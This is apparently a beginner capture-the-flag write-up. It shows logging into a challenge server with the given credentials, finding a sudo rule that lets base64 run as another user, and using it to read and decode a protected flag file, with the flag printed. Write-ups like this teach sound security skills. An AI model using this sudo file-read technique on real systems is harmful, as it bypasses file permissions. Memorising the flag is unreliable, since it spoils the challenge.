---
title: reto24
challenge_type: Misc
difficulty: Beginner
author: "@4nimanegra"
writeup_author: "@xabito"
competition: navarra-cyber-talent-25-4
summary: |-
  The flag is in a file called `/flag/flag.txt`, which is located on a server that you can access.
connections:
  - url: ssh://nct25.thehackerconclave.es:26024
    description: |-
      Username: user1
      Password: password1
---

## Recon

After connecting to the server and attempting to read the contents of the flag file, we receive a "Permission denied" error:

```bash
$ ssh user1@nct25.thehackerconclave.es -p 26024
The authenticity of host '[nct25.thehackerconclave.es]:26024 ([130.206.158.156]:26024)' can't be established.
ED25519 key fingerprint is: SHA256:eboctwumKpuClfcAGHYDA/bxoW9mhF/8GYUr0KKWvFI
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
user1@nct25.thehackerconclave.es's password: password1
user1@a9369c9cc529:~$ cat /flag/flag.txt
cat: /flag/flag.txt: Permission denied
```

The flag file is owned by the `user2` user and group, with permissions set to `770`, which means we do not have direct access to it.

```bash
$ ls -al /flag/flag.txt
-rwxrwx--- 1 user2 user2 43 Oct 16 09:22 /flag/flag.txt
```

## Exploitation

There must be a way to escalate our privileges in order to execute commands as `user2`. To investigate this, we check which commands we are permitted to run with `sudo`:

```bash
$ sudo -l
User user1 may run the following commands on a9369c9cc529:
    (user2) /usr/bin/base64
```

## Flag capture

We are allowed to execute the `base64` command as `user2`. This enables us to read the flag file in an encoded format:

```bash
$ sudo -u user2 base64 /flag/flag.txt
Y29uY2xhdmV7MWM3N2I0NDg2ZTMxNzQ3M2FhODM1MzIwOTU4NzA0MWF9Cg==
```

At this point, we simply need to decode the base64-encoded flag:

```bash
$ echo Y29uY2xhdmV7MWM3N2I0NDg2ZTMxNzQ3M2FhODM1MzIwOTU4NzA0MWF9Cg== | base64 -d
conclave{1c77b4486e317473aa8353209587041a}
```
